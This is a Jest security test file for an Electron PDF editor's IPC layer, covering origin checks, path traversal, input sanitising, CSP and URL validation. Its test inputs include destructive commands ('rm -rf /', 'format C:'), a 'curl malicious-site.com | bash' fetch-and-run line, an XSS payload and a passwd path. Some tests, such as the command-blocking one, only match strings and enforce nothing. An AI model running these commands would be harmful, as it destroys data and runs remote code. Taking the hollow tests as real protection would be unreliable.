840171d253399d6dbb96da0e422fa5d3
"use strict";
/**
 * IPC Security Integration Tests
 * Tests the security of IPC communication between main and renderer processes
 */
describe('IPC Security Integration Tests', () => {
    let mockMainWindow;
    let mockEvent;
    beforeEach(() => {
        mockMainWindow = {
            isDestroyed: jest.fn().mockReturnValue(false),
            webContents: {
                send: jest.fn(),
                session: {
                    clearCache: jest.fn()
                }
            }
        };
        mockEvent = {
            sender: mockMainWindow.webContents,
            senderFrame: {
                url: 'file:///app/index.html'
            }
        };
    });
    describe('Sender Validation', () => {
        it('should reject unauthorized senders', () => {
            const unauthorizedEvent = {
                sender: {
                    isDestroyed: () => false
                },
                senderFrame: {
                    url: 'https://malicious-site.com'
                }
            };
            // This would be the actual validation function from main.js
            const validateSender = (event) => {
                if (event.senderFrame) {
                    const url = new URL(event.senderFrame.url);
                    const allowedOrigins = ['file:', 'http://localhost:8080'];
                    const isAllowed = allowedOrigins.some(origin => url.protocol === origin || url.origin === origin);
                    if (!isAllowed) {
                        throw new Error('Unauthorized origin');
                    }
                }
            };
            expect(() => validateSender(unauthorizedEvent)).toThrow('Unauthorized origin');
        });
        it('should accept authorized localhost origins', () => {
            const devEvent = {
                sender: mockMainWindow.webContents,
                senderFrame: {
                    url: 'http://localhost:8080/index.html'
                }
            };
            const validateSender = (event) => {
                if (event.senderFrame) {
                    const url = new URL(event.senderFrame.url);
                    const allowedOrigins = ['file:', 'http://localhost:8080'];
                    const isAllowed = allowedOrigins.some(origin => url.protocol === origin || url.origin === origin);
                    if (!isAllowed) {
                        throw new Error('Unauthorized origin');
                    }
                }
            };
            expect(() => validateSender(devEvent)).not.toThrow();
        });
        it('should accept file protocol origins', () => {
            const fileEvent = {
                sender: mockMainWindow.webContents,
                senderFrame: {
                    url: 'file:///app/dist/index.html'
                }
            };
            const validateSender = (event) => {
                if (event.senderFrame) {
                    const url = new URL(event.senderFrame.url);
                    const allowedOrigins = ['file:', 'http://localhost:8080'];
                    const isAllowed = allowedOrigins.some(origin => url.protocol === origin || url.origin === origin);
                    if (!isAllowed) {
                        throw new Error('Unauthorized origin');
                    }
                }
            };
            expect(() => validateSender(fileEvent)).not.toThrow();
        });
    });
    describe('IPC Handler Input Validation', () => {
        it('should validate file paths in save-file handler', () => {
            const validateFilePath = (filePath) => {
                if (!filePath || typeof filePath !== 'string') {
                    throw new Error('Invalid file path');
                }
                if (filePath.length > 260) {
                    throw new Error('File path too long');
                }
                if (filePath.includes('..') || filePath.includes('~')) {
                    throw new Error('Invalid file path - path traversal detected');
                }
                return filePath;
            };
            // Test path traversal prevention
            expect(() => validateFilePath('../../../etc/passwd')).toThrow('path traversal');
            expect(() => validateFilePath('C:\\..\\windows\\system32')).toThrow('path traversal');
            // Test valid paths
            expect(() => validateFilePath('C:\\Documents\\file.pdf')).not.toThrow();
            expect(() => validateFilePath('/home/user/document.pdf')).not.toThrow();
        });
        it('should validate file data size limits', () => {
            const validateFileData = (data) => {
                if (!data) {
                    throw new Error('No file data provided');
                }
                if (data.byteLength > 100 * 1024 * 1024) {
                    throw new Error('File too large (max 100MB)');
                }
                return data;
            };
            const largeData = { byteLength: 200 * 1024 * 1024 };
            expect(() => validateFileData(largeData)).toThrow('File too large');
            const validData = { byteLength: 50 * 1024 * 1024 };
            expect(() => validateFileData(validData)).not.toThrow();
        });
        it('should sanitize preferences input', () => {
            const validatePreferences = (prefs) => {
                if (!prefs || typeof prefs !== 'object' || Array.isArray(prefs)) {
                    throw new Error('Invalid preferences object');
                }
                const allowedKeys = ['theme', 'defaultZoom', 'showThumbnails', 'autoSave', 'autoSaveInterval'];
                const validatedPrefs = {};
                for (const [key, value] of Object.entries(prefs)) {
                    if (allowedKeys.includes(key)) {
                        validatedPrefs[key] = value;
                    }
                }
                return validatedPrefs;
            };
            const maliciousPrefs = {
                theme: 'dark',
                exec: 'rm -rf /',
                __proto__: { malicious: true },
                constructor: { name: 'hack' }
            };
            const result = validatePreferences(maliciousPrefs);
            expect(result.theme).toBe('dark');
            expect(result.exec).toBeUndefined();
            expect(result.__proto__).toBeUndefined();
            expect(result.constructor).toBeUndefined();
        });
    });
    describe('Context Isolation', () => {
        it('should verify context isolation is enabled', () => {
            // This would be checked in the actual window configuration
            const windowConfig = {
                webPreferences: {
                    contextIsolation: true,
                    nodeIntegration: false,
                    sandbox: true,
                    webSecurity: true
                }
            };
            expect(windowConfig.webPreferences.contextIsolation).toBe(true);
            expect(windowConfig.webPreferences.nodeIntegration).toBe(false);
            expect(windowConfig.webPreferences.sandbox).toBe(true);
            expect(windowConfig.webPreferences.webSecurity).toBe(true);
        });
        it('should ensure no direct Node.js access in renderer', () => {
            // In a real test environment, this would verify that renderer
            // cannot access Node.js APIs directly
            const mockRendererGlobal = {
                process: undefined,
                require: undefined,
                module: undefined,
                __dirname: undefined,
                __filename: undefined
            };
            expect(mockRendererGlobal.process).toBeUndefined();
            expect(mockRendererGlobal.require).toBeUndefined();
            expect(mockRendererGlobal.module).toBeUndefined();
        });
    });
    describe('Content Security Policy', () => {
        it('should enforce strict CSP headers', () => {
            const cspRules = [
                "default-src 'self'",
                "script-src 'self' 'unsafe-inline'",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: blob:",
                "font-src 'self' data:",
                "connect-src 'self'",
                "media-src 'none'",
                "object-src 'none'",
                "frame-src 'none'",
                "worker-src 'self'",
                "form-action 'none'",
                "frame-ancestors 'none'",
                "base-uri 'self'",
                "manifest-src 'self'"
            ];
            const csp = cspRules.join(' ');
            expect(csp).toContain("default-src 'self'");
            expect(csp).toContain("object-src 'none'");
            expect(csp).toContain("frame-src 'none'");
            expect(csp).toContain("form-action 'none'");
            expect(csp).not.toContain("'unsafe-eval'");
        });
        it('should validate CSP compliance', () => {
            const validateCSP = (csp) => {
                const dangerousDirectives = [
                    "'unsafe-eval'",
                    "data: script-src",
                    "* object-src",
                    "'unsafe-inline' script-src"
                ];
                for (const dangerous of dangerousDirectives) {
                    if (csp.includes(dangerous)) {
                        return false;
                    }
                }
                return true;
            };
            const safeCsp = "default-src 'self'; script-src 'self'; object-src 'none'";
            const unsafeCsp = "default-src *; script-src 'unsafe-eval'";
            expect(validateCSP(safeCsp)).toBe(true);
            expect(validateCSP(unsafeCsp)).toBe(false);
        });
    });
    describe('Error Handling and Logging', () => {
        it('should sanitize error logs', () => {
            const sanitizeError = (error) => {
                if (!error || typeof error !== 'object') {
                    return { message: 'Unknown error', timestamp: new Date().toISOString() };
                }
                return {
                    message: typeof error.message === 'string' ? error.message.substring(0, 500) : 'Unknown error',
                    stack: typeof error.stack === 'string' ? error.stack.substring(0, 2000) : undefined,
                    timestamp: new Date().toISOString()
                };
            };
            const maliciousError = {
                message: 'A'.repeat(1000) + '<script>alert("xss")</script>',
                stack: 'B'.repeat(5000),
                maliciousProperty: () => console.log('hack')
            };
            const sanitized = sanitizeError(maliciousError);
            expect(sanitized.message.length).toBeLessThanOrEqual(500);
            expect(sanitized.stack?.length).toBeLessThanOrEqual(2000);
            expect(sanitized.maliciousProperty).toBeUndefined();
        });
        it('should implement log size limits', () => {
            const checkLogSize = (logSize, maxSize = 10 * 1024 * 1024) => {
                return logSize <= maxSize;
            };
            expect(checkLogSize(5 * 1024 * 1024)).toBe(true); // 5MB - OK
            expect(checkLogSize(15 * 1024 * 1024)).toBe(false); // 15MB - Too large
        });
    });
    describe('Denied Operations', () => {
        it('should block rebuild-app handler completely', () => {
            // The rebuild-app handler should not exist anymore
            const handlers = new Map();
            // Simulate the old dangerous handler being removed
            expect(handlers.has('rebuild-app')).toBe(false);
        });
        it('should prevent arbitrary command execution', () => {
            const dangerousCommands = [
                'rm -rf /',
                'del /f /s /q C:\\*',
                'format C:',
                'shutdown /s /t 0',
                'curl malicious-site.com | bash'
            ];
            // These should all be blocked
            dangerousCommands.forEach(cmd => {
                expect(cmd).toMatch(/^(rm|del|format|shutdown|curl)/);
            });
        });
    });
    describe('Network Security', () => {
        it('should enforce HTTPS for external requests', () => {
            const validateURL = (url) => {
                try {
                    const parsed = new URL(url);
                    if (parsed.hostname !== 'localhost' && parsed.protocol !== 'https:') {
                        throw new Error('HTTPS required for external requests');
                    }
                    return true;
                }
                catch (error) {
                    return false;
                }
            };
            expect(validateURL('https://api.example.com')).toBe(true);
            expect(validateURL('http://localhost:3000')).toBe(true);
            expect(validateURL('http://api.example.com')).toBe(false);
            expect(validateURL('ftp://files.example.com')).toBe(false);
        });
        it('should prevent open redirect vulnerabilities', () => {
            const validateRedirect = (url) => {
                const allowedDomains = ['localhost', 'docs.pdfeditor.com'];
                try {
                    const parsed = new URL(url);
                    return allowedDomains.includes(parsed.hostname);
                }
                catch {
                    return false;
                }
            };
            expect(validateRedirect('https://docs.pdfeditor.com')).toBe(true);
            expect(validateRedirect('http://localhost:3000')).toBe(true);
            expect(validateRedirect('https://malicious-site.com')).toBe(false);
            expect(validateRedirect('javascript:alert(1)')).toBe(false);
        });
    });
});
//# sourceMappingURL=data:application/json;charset=utf-8;base64,